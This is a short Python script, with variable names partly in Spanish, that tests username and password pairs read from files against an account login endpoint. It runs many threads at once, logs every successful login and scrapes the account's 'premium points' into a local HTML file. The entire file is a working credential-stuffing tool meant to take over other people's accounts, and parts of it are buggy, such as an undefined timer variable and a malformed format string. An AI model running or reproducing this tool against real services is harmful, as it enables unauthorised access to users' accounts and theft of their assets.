from threading import Thread
import time
import http.cookiejar as cookielib
from bs4 import BeautifulSoup
import requests
import re


archivo1 = open('passwords', errors="ignore")
archivo = open('users', errors="ignore")


def brute(li, lin):
    requests.packages.urllib3.disable_warnings()
    jar = cookielib.CookieJar()
    session = requests.session()
    burp0_url = "https://example.net:443/accountmanagement"
    burp0_data = {"account_login": li, "password_login": lin}
    r = session.post(burp0_url, cookies=jar, data=burp0_data)
    respuesta = r.content
    soup = BeautifulSoup(respuesta, 'html.parser')
    e = soup.findAll("table", {"class": "TableContent"})

    if(respuesta.find(b"Welcome to your account!") > 0):
        r2 = session.get('https://example.net/shopystem')
        respuesta2 = r2.content
        soup = BeautifulSoup(respuesta2, 'html.parser')
        match = re.findall(r'pointsYou have premium points: (\S+)', soup.text)
        print(li + ":" + lin + '----------FOUND--------------')
        text_file1 = open("cuentas.html", "a")
        text_file1.write(str(e))
        if match:
            text_file1.write("---- Premmium Points: %s ----" % (match))
        text_file1.write(" usuario:%s password:%s  \n" % (li, lin))
        text_file1.close()
    else:
        print(li + ":" + lin + 'no')


for li, lin in zip(archivo.read().split('\n'), archivo1.read().split('\n')):
    thrdlst = []
    t = Thread(target=brute, args=(li, lin))
    t.start()
    thrdlst.append(t)
    time.sleep(0.08)

for b in thrdlst:
    b.join()

print("%0.7 sec" % (time.clock() - t0))
